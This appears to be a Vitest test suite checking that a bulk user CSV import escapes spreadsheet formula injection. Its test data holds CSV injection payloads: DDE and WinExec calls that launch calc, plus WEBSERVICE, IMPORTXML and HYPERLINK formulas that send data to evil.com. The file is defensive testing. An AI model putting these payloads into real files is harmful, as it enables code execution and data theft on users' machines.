import { describe, it, expect } from 'vitest';
import { parseBulkUserData } from '../../utils/bulkUserParser';

describe('CSV Injection Protection', () => {
  describe('Formula Prevention', () => {
    it('should sanitize cells starting with equals sign', () => {
      const csvData = `email,firstName,lastName,role
test@example.com,=SUM(A1:A10),Normal,docente
user@example.com,Normal,=CONCATENATE(A1;B1),docente`;

      const result = parseBulkUserData(csvData);
      
      expect(result.valid).toHaveLength(2);
      expect(result.valid[0].firstName).toBe("'=SUM(A1:A10)");
      expect(result.valid[1].lastName).toBe("'=CONCATENATE(A1;B1)");
    });

    it('should sanitize cells starting with plus sign', () => {
      const csvData = `email,firstName,lastName,role
test@example.com,+SUM(A1:A10),Normal,docente
user@example.com,Normal,+cmd,docente`;

      const result = parseBulkUserData(csvData);
      
      expect(result.valid).toHaveLength(2);
      expect(result.valid[0].firstName).toBe("'+SUM(A1:A10)");
      expect(result.valid[1].lastName).toBe("'+cmd");
    });

    it('should sanitize cells starting with minus sign', () => {
      const csvData = `email,firstName,lastName,role
test@example.com,-2+5,Normal,docente
user@example.com,Normal,-cmd,docente`;

      const result = parseBulkUserData(csvData);
      
      expect(result.valid).toHaveLength(2);
      expect(result.valid[0].firstName).toBe("'-2+5");
      expect(result.valid[1].lastName).toBe("'-cmd");
    });

    it('should sanitize cells starting with at sign', () => {
      const csvData = `email,firstName,lastName,role
test@example.com,@SUM(A1:A10),Normal,docente
user@example.com,Normal,@cmd,docente`;

      const result = parseBulkUserData(csvData);
      
      expect(result.valid).toHaveLength(2);
      expect(result.valid[0].firstName).toBe("'@SUM(A1:A10)");
      expect(result.valid[1].lastName).toBe("'@cmd");
    });

    it('should sanitize cells starting with tab character', () => {
      const csvData = `email,firstName,lastName,role\ntest@example.com,"\tSUM(A1:A10)",Normal,docente`;

      const result = parseBulkUserData(csvData);
      
      expect(result.valid).toHaveLength(1);
      expect(result.valid[0].firstName).toBe("'\tSUM(A1:A10)");
    });

    it('should sanitize cells starting with carriage return', () => {
      const csvData = `email,firstName,lastName,role\ntest@example.com,"\rSUM(A1:A10)",Normal,docente`;

      const result = parseBulkUserData(csvData);
      
      expect(result.valid).toHaveLength(1);
      expect(result.valid[0].firstName).toBe("'\rSUM(A1:A10)");
    });
  });

  describe('Complex Formula Attacks', () => {
    it('should protect against Excel formula injection', () => {
      const csvData = `email,firstName,lastName,role\nevil@hacker.com,"=cmd|'/c calc'!A0",Victim,docente\nevil2@hacker.com,"=HYPERLINK(\"http://evil.com\"; \"Click me\")",User,docente`;

      const result = parseBulkUserData(csvData);
      
      expect(result.valid).toHaveLength(2);
      expect(result.valid[0].firstName).toBe("'=cmd|'/c calc'!A0");
      expect(result.valid[1].firstName).toContain("'=HYPERLINK");
    });

    it('should protect against Google Sheets DDE attacks', () => {
      const csvData = `email,firstName,lastName,role\nattacker@evil.com,"=DDE(\"cmd\";\"/C calc\";\"cmd\")",Innocent,docente\nattacker2@evil.com,"=IMPORTXML(\"http://evil.com/xml\"; \"//data\")",Name,docente`;

      const result = parseBulkUserData(csvData);
      
      expect(result.valid).toHaveLength(2);
      expect(result.valid[0].firstName).toContain("'=DDE");
      expect(result.valid[1].firstName).toContain("'=IMPORTXML");
    });

    it('should protect against LibreOffice formula injection', () => {
      const csvData = `email,firstName,lastName,role\nlibre@attack.com,"=WEBSERVICE(\"http://evil.com/steal-data\")",User,docente\nlibre2@attack.com,"\"+CALL(\"kernel32\";\"WinExec\";\"JJ\";;\"calc\";0)\"",Name,docente`;

      const result = parseBulkUserData(csvData);
      
      expect(result.valid).toHaveLength(2);
      expect(result.valid[0].firstName).toContain("'=WEBSERVICE");
      expect(result.valid[1].firstName).toContain("'+CALL");
    });
  });

  describe('Email Field Protection', () => {
    it('should protect email field from formula injection', () => {
      const csvData = `email,firstName,lastName,role\n"=SUM(A1:A10)@evil.com",John,Doe,docente\n"+cmd@hacker.com",Jane,Smith,docente`;

      const result = parseBulkUserData(csvData);
      
      // These should be considered invalid emails due to formula characters
      expect(result.invalid).toHaveLength(2);
      expect(result.invalid[0].errors).toContain('Email inválido');
      expect(result.invalid[1].errors).toContain('Email inválido');
    });

    it('should handle legitimate emails with similar patterns', () => {
      const csvData = `email,firstName,lastName,role
user+tag@example.com,John,Doe,docente
user-name@example.com,Jane,Smith,docente
user@sub-domain.example.com,Bob,Johnson,docente`;

      const result = parseBulkUserData(csvData);
      
      expect(result.valid).toHaveLength(3);
      expect(result.invalid).toHaveLength(0);
    });
  });

  describe('Role Field Protection', () => {
    it('should sanitize role field formulas', () => {
      const csvData = `email,firstName,lastName,role\ntest@example.com,John,Doe,=CONCATENATE\nuser@example.com,Jane,Smith,+admin`;

      const result = parseBulkUserData(csvData);
      
      // These should be invalid due to unknown role
      expect(result.invalid.length).toBeGreaterThan(0);
      expect(result.invalid.some(user => user.errors?.some(e => e.includes('Rol inválido')))).toBe(true);
    });

    it('should accept valid roles even after sanitization', () => {
      const csvData = `email,firstName,lastName,role
test@example.com,John,Doe,docente
admin@example.com,Jane,Smith,admin`;

      const result = parseBulkUserData(csvData);
      
      expect(result.valid).toHaveLength(2);
      expect(result.valid[0].role).toBe('docente');
      expect(result.valid[1].role).toBe('admin');
    });
  });

  describe('RUT Field Protection', () => {
    it('should sanitize RUT field formulas', () => {
      const csvData = `email,firstName,lastName,role,rut\ntest@example.com,John,Doe,docente,"=SUM(A1:A10)"\nuser@example.com,Jane,Smith,docente,"+12345678-5"`;

      const result = parseBulkUserData(csvData);
      
      // These should be invalid due to invalid RUT format
      expect(result.invalid).toHaveLength(2);
      expect(result.invalid[0].errors).toContain('RUT inválido');
      expect(result.invalid[1].errors).toContain('RUT inválido');
    });

    it('should accept valid RUTs', () => {
      const csvData = `email,firstName,lastName,role,rut
test@example.com,John,Doe,docente,12.345.678-5
user@example.com,Jane,Smith,docente,11.111.111-1`;

      const result = parseBulkUserData(csvData);
      
      expect(result.valid).toHaveLength(2);
      expect(result.invalid).toHaveLength(0);
    });
  });

  describe('Newline Character Protection', () => {
    it('should replace newlines in field values', () => {
      const csvData = `email,firstName,lastName,role\ntest@example.com,"First\nLine","Last\nLine",docente`;

      const result = parseBulkUserData(csvData);
      
      expect(result.valid).toHaveLength(1);
      expect(result.valid[0].firstName).toBe('First Line');
      expect(result.valid[0].lastName).toBe('Last Line');
    });

    it('should replace carriage returns in field values', () => {
      const csvData = `email,firstName,lastName,role
test@example.com,"First\rLine","Last\rLine",docente`;

      const result = parseBulkUserData(csvData);
      
      expect(result.valid).toHaveLength(1);
      expect(result.valid[0].firstName).toBe('First Line');
      expect(result.valid[0].lastName).toBe('Last Line');
    });

    it('should handle mixed newline characters', () => {
      const csvData = `email,firstName,lastName,role\ntest@example.com,"First\r\nLine","Last\n\rLine",docente`;

      const result = parseBulkUserData(csvData);
      
      expect(result.valid).toHaveLength(1);
      expect(result.valid[0].firstName).toBe('First Line');
      expect(result.valid[0].lastName).toBe('Last Line');
    });
  });

  describe('Edge Cases', () => {
    it('should handle empty fields safely', () => {
      const csvData = `email,firstName,lastName,role
test@example.com,,,docente
user@example.com,"","",docente`;

      const result = parseBulkUserData(csvData);
      
      expect(result.valid).toHaveLength(2);
      // Empty fields should not be modified
      expect(result.valid[0].firstName).toBe('');
      expect(result.valid[0].lastName).toBe('');
    });

    it('should handle fields with only formula characters', () => {
      const csvData = `email,firstName,lastName,role
test@example.com,=,+,docente
user@example.com,-,@,docente`;

      const result = parseBulkUserData(csvData);
      
      expect(result.valid).toHaveLength(2);
      expect(result.valid[0].firstName).toBe("'=");
      expect(result.valid[0].lastName).toBe("'+");
      expect(result.valid[1].firstName).toBe("'-");
      expect(result.valid[1].lastName).toBe("'@");
    });

    it('should handle fields with formula characters in middle', () => {
      const csvData = `email,firstName,lastName,role
test@example.com,John=Doe,Smith+Johnson,docente
user@example.com,Jane-Smith,Bob@Work,docente`;

      const result = parseBulkUserData(csvData);
      
      expect(result.valid).toHaveLength(2);
      // Formula characters in middle should not be escaped
      expect(result.valid[0].firstName).toBe('John=Doe');
      expect(result.valid[0].lastName).toBe('Smith+Johnson');
      expect(result.valid[1].firstName).toBe('Jane-Smith');
      expect(result.valid[1].lastName).toBe('Bob@Work');
    });

    it('should handle quoted fields with formula characters', () => {
      const csvData = `email,firstName,lastName,role
test@example.com,"=SUM(A1:A10)","Normal Name",docente
user@example.com,"Normal","=EVIL_FORMULA()",docente`;

      const result = parseBulkUserData(csvData);
      
      expect(result.valid).toHaveLength(2);
      expect(result.valid[0].firstName).toBe("'=SUM(A1:A10)");
      expect(result.valid[0].lastName).toBe('Normal Name');
      expect(result.valid[1].firstName).toBe('Normal');
      expect(result.valid[1].lastName).toBe("'=EVIL_FORMULA()");
    });

    it('should handle very long formula injections', () => {
      const longFormula = '=' + 'A'.repeat(1000) + '(B1:B1000)';
      const csvData = `email,firstName,lastName,role
test@example.com,${longFormula},Normal,docente`;

      const result = parseBulkUserData(csvData);
      
      expect(result.valid).toHaveLength(1);
      expect(result.valid[0].firstName).toBe("'" + longFormula);
    });
  });

  describe('Performance and Security', () => {
    it('should handle large CSV with many formula attempts efficiently', () => {
      const rows = ['email,firstName,lastName,role'];
      
      // Generate 100 rows with formula injections
      for (let i = 0; i < 100; i++) {
        rows.push(`user${i}@example.com,=SUM(A1:A${i}),+EVIL${i},docente`);
      }
      
      const csvData = rows.join('\n');
      const startTime = Date.now();
      
      const result = parseBulkUserData(csvData);
      
      const endTime = Date.now();
      const processingTime = endTime - startTime;
      
      expect(result.valid).toHaveLength(100);
      expect(processingTime).toBeLessThan(1000); // Should process in under 1 second
      
      // Verify all formulas were escaped
      result.valid.forEach((user, index) => {
        expect(user.firstName).toBe(`'=SUM(A1:A${index})`);
        expect(user.lastName).toBe(`'+EVIL${index}`);
      });
    });

    it('should not be vulnerable to ReDoS attacks', () => {
      // Create a potentially malicious pattern that could cause ReDoS
      const maliciousPattern = '=' + '+'.repeat(1000) + 'A';
      const csvData = `email,firstName,lastName,role
test@example.com,${maliciousPattern},Normal,docente`;

      const startTime = Date.now();
      const result = parseBulkUserData(csvData);
      const endTime = Date.now();
      
      expect(endTime - startTime).toBeLessThan(100); // Should process quickly
      expect(result.valid).toHaveLength(1);
      expect(result.valid[0].firstName).toBe("'" + maliciousPattern);
    });
  });
});